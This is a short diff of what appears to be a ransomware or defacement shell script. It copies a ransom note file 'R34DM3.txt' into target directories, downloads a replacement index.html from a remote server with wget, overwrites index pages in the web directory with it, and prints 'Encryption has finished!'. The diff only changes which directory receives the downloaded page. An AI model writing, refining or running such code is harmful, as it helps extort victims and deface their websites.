@@ -74,8 +74,8 @@ for dir in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $targe
     cp R34DM3.txt "$dir/R34DM3.txt"
 done
 
-wget -P /var/www http://server/index.html
+wget -P $target_dir_4 http://server/index.html
 
-find /var/www -name "index.*" -type f -execdir mv index.html {} \;
+find $target_dir_4 -name "index.*" -type f -execdir mv index.html {} \;
 
 echo "Encryption has finished!"
